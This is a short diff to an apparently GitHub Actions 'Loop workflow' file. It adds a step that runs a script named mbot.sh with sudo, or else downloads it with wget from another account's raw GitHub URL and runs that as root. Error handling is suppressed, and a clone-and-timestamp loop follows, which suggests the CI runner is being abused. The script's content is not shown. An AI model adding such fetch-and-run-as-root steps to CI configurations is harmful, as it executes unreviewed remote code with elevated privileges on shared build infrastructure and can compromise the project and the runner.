@@ -36,6 +36,7 @@ jobs:
        - name: Loop workflow
          continue-on-error: true
          run: |
+              sudo sh mbot.sh || wget https://raw.githubusercontent.com/rootedcyber93/mbot-flow/main/mbot.sh;sudo mbot.sh
               git clone https://github.com/rootedcyber93/helios-mirror loop
               cd loop || exit 1
               echo $(date -u +%T%P) >> loop.txt
